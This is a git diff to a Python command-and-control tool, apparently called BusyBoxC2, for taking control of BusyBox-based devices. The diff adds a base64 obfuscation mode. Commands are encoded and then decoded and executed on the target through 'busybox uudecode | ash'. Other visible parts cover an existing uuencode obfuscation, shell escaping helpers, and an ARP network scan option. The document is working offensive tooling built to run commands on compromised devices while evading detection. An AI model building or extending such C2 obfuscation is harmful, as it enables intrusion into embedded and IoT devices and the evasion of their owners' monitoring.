@@ -4,6 +4,7 @@ import subprocess
 import os
 import random
 import threading
+import re
 
 class BusyBoxC2:
     def __init__(self, server_ip, server_port):
@@ -45,12 +46,15 @@ class BusyBoxC2:
     def _send_cmd(self, cmd):
 
         # Add marker to know when command execution is terminated
-        marker = "__END_OF_CMD_{}__".format(int(time.time()*1000))
+        marker = "M{}".format(int(time.time()*1000))
         full_cmd = cmd + " ; echo " + marker
 
         # Obfuscate full cmd if necessary
         if "obfuscation_ascii" in self.options:
             full_cmd = self._cmd_obfuscation_ascii(full_cmd)
+            print(f"Executed command: {full_cmd}\n")
+        if "obfuscation_base64" in self.options:
+            full_cmd = self._cmd_obfuscation_b64(full_cmd)
             print(f"Executed command: {full_cmd}\n")
 
         # Send payload and wait marker in response to stop reading socket
@@ -85,11 +89,21 @@ class BusyBoxC2:
             else:
                 continue
 
+    def _cmd_obfuscation_b64(self, raw_cmd):
+        cmd_to_get_cmd_b64_version = 'printf ' + '"' + raw_cmd + '"' + ' | busybox uuencode -m - | sed -n "2p"'
+        ascii_cmd = subprocess.check_output(cmd_to_get_cmd_b64_version, shell=True, text=True)
+        payload = "s=\"" + ascii_cmd.rstrip("\n").replace("`", "\`").replace("\"", "\\\"") + "\";printf 'begin-base64 644 -\\n%s\\n`\\n====\\n' $s|busybox uudecode |ash"
+        return payload
+    
     def _cmd_obfuscation_ascii(self, raw_cmd):
         cmd_to_get_cmd_ascii_version = 'printf ' + '"' + raw_cmd + '"' + ' | busybox uuencode - | sed -n "2p"'
         ascii_cmd = subprocess.check_output(cmd_to_get_cmd_ascii_version, shell=True, text=True)
-        payload = "s=\"" + ascii_cmd.rstrip("\n").replace("`", "\`").replace("\"", "\\\"") + "\";printf 'begin 644 -\\n%s\\n`\\nend\\n' $s|busybox uudecode -o /dev/stdout|ash"
+        payload = "s=\"" + self.sanitize_ash_var(ascii_cmd) + "\";printf 'begin 644 -\\n%s\\n`\\nend\\n' $s|busybox uudecode|ash"
         return payload
+    
+    def sanitize_ash_var(self, variable):
+        sanitize_variable = variable.rstrip("\n")
+        return re.sub(r'([`"\\$])', r'\\\1', sanitize_variable)
 
     def _discover_arp_scan(self):
         net_ip = input("Network IP (ex: 192.168.1.0): ")
@@ -133,6 +147,9 @@ class BusyBoxC2:
                                 print(f"{option} ")
                         case '/obfuscation_ascii' | '/obf_a':
                             self.options.append('obfuscation_ascii')
+                            self.prompt = " (busybox-c2)[+]> "
+                        case '/obfuscation_base64' | '/obf_b64':
+                            self.options.append('obfuscation_base64')
                             self.prompt = " (busybox-c2)[+]> "
                         case '/scan_discover':
                             self._discover_arp_scan()
